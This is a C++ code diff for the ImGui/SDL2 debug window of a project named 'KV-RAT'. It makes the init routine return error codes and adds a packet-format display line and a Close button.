@@ -11,12 +11,12 @@ Debug::~Debug()
     device::print("[-] Debugging Disabled\n");
 }
 
-void Debug::init() 
+int Debug::init() 
 {
     if(SDL_Init(SDL_INIT_VIDEO) < 0)
     {
         device::print("[-] SDL2 failed to initialize: %s\n", SDL_GetError());
-        return;
+        return -1;
     }
 
     window_flags = (SDL_WindowFlags)(SDL_WINDOW_OPENGL | SDL_WINDOW_RESIZABLE | SDL_WINDOW_ALLOW_HIGHDPI);
@@ -24,7 +24,7 @@ void Debug::init()
     if (window == nullptr)
     {
         device::print("[-] SDL2 failed to create window: %s\n", SDL_GetError());
-        return;
+        return -1;
     }
 
     gl_context = SDL_GL_CreateContext(window);
@@ -65,6 +65,8 @@ void Debug::init()
         ImGui_ImplOpenGL2_RenderDrawData(ImGui::GetDrawData());
         SDL_GL_SwapWindow(window);
     }
+
+    return 0;
 }
 
 void Debug::Gui()
@@ -78,6 +80,10 @@ void Debug::Gui()
     {
         ImGui::Text("Welcome to the KV-RAT Debug Tools!");
         ImGui::Button("Test Button");
+
+        ImGui::Text("Current Client Packet: {\"response\": \"\", \"information\": \"\"}");
+
+        done = ImGui::Button("Close");
     }
     ImGui::End();
 
